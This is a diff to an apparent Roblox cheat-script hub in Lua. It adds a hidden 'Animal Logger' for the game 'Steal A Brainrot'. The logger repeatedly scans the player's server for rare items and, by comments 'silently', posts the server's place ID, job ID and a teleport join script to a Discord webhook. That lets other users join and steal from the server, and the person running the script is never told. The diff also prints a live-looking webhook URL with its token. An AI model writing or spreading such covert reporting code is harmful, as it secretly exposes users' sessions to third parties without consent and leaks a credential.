@@ -16,6 +16,30 @@ local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui", 5)
 
+-- Target Game ID for Animal Logger
+local STEAL_A_BRAINROT_ID = 109983668079237
+
+-- Animal names to detect and log
+local espTargetNames = {
+    "Noobini Pizzanini", "Los Tralaleritos", "Las Tralaleritas", "Graipuss Medussi",
+    "La Grande Combinasion", "Nuclearo Dinossauro", "Garama and Madundung", "Pot Hotspot",
+    "Las Vaquitas Saturnitas", "Chicleteira Bicicleteira", "Dragon Cannelloni", "Los Combinasionas",
+    "Karkerkar Kurkur", "Los Hotspotsitos", "Esok Sekolah", "Blackhole Goat", "Dul Dul Dul",
+    "Tortuginni Dragonfruitini", "Chimpanzini Spiderini", "Los Matteos", "Nooo My Hotspot",
+    "Sammyini Spyderini", "La Supreme Combinasion", "Ketupat Kepat", "Los Orcalitos",
+    "Urubini Flamenguini", "Tralalita Tralala", "Orcalero Orcala", "Bulbito Bandito Traktorito",
+    "Piccione Macchina", "Trippi Troppi Troppa Trippa", "Los Tungtungtungcitos"
+}
+
+-- Create lookup table for faster checking
+local espTargetLookup = {}
+for _, name in pairs(espTargetNames) do
+    espTargetLookup[name] = true
+end
+
+-- Tracked animals to prevent spam
+local loggedAnimals = {}
+
 -- UserIds
 local OwnerUserId = "2341777244"
 local PremiumUsers = {
@@ -40,8 +64,153 @@ local BlacklistUsers = {
 	"229691" -- ravyn [PERM]
 }
 
--- Webhook URL
+-- Webhook URLs
 local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"
+
+-- Animal Logger Functions
+local function scanPlotsForAnimals()
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then 
+        return {}
+    end
+    
+    local foundAnimals = {}
+    
+    -- Check each randomly generated plot
+    for _, plot in pairs(plots:GetChildren()) do
+        if plot:IsA("Model") then
+            local plotName = plot.Name
+            
+            -- Check direct children of this plot for target animals
+            for _, child in pairs(plot:GetChildren()) do
+                if child:IsA("Model") and espTargetLookup[child.Name] then
+                    local animalId = plotName .. "_" .. child.Name
+                    
+                    -- Only log if we haven't logged this animal before
+                    if not loggedAnimals[animalId] then
+                        table.insert(foundAnimals, {
+                            plotName = plotName,
+                            animalName = child.Name,
+                            animalId = animalId
+                        })
+                        loggedAnimals[animalId] = true
+                    end
+                end
+            end
+        end
+    end
+    
+    return foundAnimals
+end
+
+local function scanRenderedMovingAnimals()
+    local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
+    if not renderedAnimals then 
+        return {}
+    end
+    
+    local foundAnimals = {}
+    
+    -- Check direct children for target animals
+    for _, child in pairs(renderedAnimals:GetChildren()) do
+        if child:IsA("Model") and espTargetLookup[child.Name] then
+            local animalId = "RenderedMoving_" .. child.Name
+            
+            -- Only log if we haven't logged this animal before
+            if not loggedAnimals[animalId] then
+                table.insert(foundAnimals, {
+                    plotName = "RenderedMovingAnimals",
+                    animalName = child.Name,
+                    animalId = animalId
+                })
+                loggedAnimals[animalId] = true
+            end
+        end
+    end
+    
+    return foundAnimals
+end
+
+local function sendAnimalLog(animals)
+    if #animals == 0 then return end
+    
+    pcall(function()
+        local placeId = tostring(game.PlaceId)
+        local jobId = game.JobId or "Unknown"
+        
+        -- Create animal list text
+        local animalList = ""
+        for i, animal in pairs(animals) do
+            animalList = animalList .. "**" .. animal.animalName .. "**"
+            if i < #animals then
+                animalList = animalList .. "\n"
+            end
+        end
+        
+        -- Create join script
+        local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)'
+        
+        local send_data = {
+            ["username"] = "Pickle Notifyer",
+            ["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
+            ["content"] = "Best Notifyer!",
+            ["embeds"] = {
+                {
+                    ["title"] = "Premium Notifyer",
+                    ["description"] = "**Found " .. #animals .. " rare animal(s):**\n\n" .. animalList,
+                    ["color"] = 15844367, -- Gold color
+                    ["fields"] = {
+                        {["name"] = "Brainrots", ["value"] = tostring(#animals), ["inline"] = true},
+                        {["name"] = "Join Script", ["value"] = joinScript, ["inline"] = false},
+                        {["name"] = "Quick Join", ["value"] = '[Join Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = false}
+                    },
+                    ["footer"] = {
+                        ["text"] = "Animal Detection System • Scripts Hub X",
+                        ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"
+                    }
+                }
+            }
+        }
+        
+        local headers = {["Content-Type"] = "application/json"}
+        pcall(function()
+            if request and type(request) == "function" then
+                request({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = headers,
+                    Body = HttpService:JSONEncode(send_data)
+                })
+            elseif http_request and type(http_request) == "function" then
+                http_request({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = headers,
+                    Body = HttpService:JSONEncode(send_data)
+                })
+            end
+        end)
+    end)
+end
+
+local function checkForAnimals()
+    local plotAnimals = scanPlotsForAnimals()
+    local renderedAnimals = scanRenderedMovingAnimals()
+    
+    -- Combine both results
+    local allAnimals = {}
+    for _, animal in pairs(plotAnimals) do
+        table.insert(allAnimals, animal)
+    end
+    for _, animal in pairs(renderedAnimals) do
+        table.insert(allAnimals, animal)
+    end
+    
+    -- Send to webhook if animals found (silently)
+    if #allAnimals > 0 then
+        sendAnimalLog(allAnimals)
+    end
+end
 
 -- Notification function
 local function notify(title, text)
@@ -375,6 +544,33 @@ local function checkUserStatus()
 	return "regular"
 end
 
+-- Initialize Animal Logger for Steal A Brainrot
+local function initializeAnimalLogger()
+	if game.PlaceId == STEAL_A_BRAINROT_ID then
+		-- Initial scan after delay
+		task.spawn(function()
+			task.wait(5) -- Wait for game to fully load
+			checkForAnimals()
+		end)
+		
+		-- Monitor for new animals being added
+		workspace.DescendantAdded:Connect(function(descendant)
+			if descendant:IsA("Model") and espTargetLookup[descendant.Name] then
+				task.wait(2) -- Small delay to ensure the animal is fully loaded
+				checkForAnimals()
+			end
+		end)
+		
+		-- Periodic scan every 5 seconds to catch any missed animals
+		task.spawn(function()
+			while true do
+				task.wait(5)
+				checkForAnimals()
+			end
+		end)
+	end
+end
+
 -- ================================
 -- MAIN EXECUTION (SIMPLIFIED)
 -- ================================
@@ -396,6 +592,9 @@ spawn(function()
 	
 	-- Send webhook notification
 	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
+	
+	-- Initialize Animal Logger (silently)
+	initializeAnimalLogger()
 	
 	-- Handle unsupported games
 	if not isSupported then
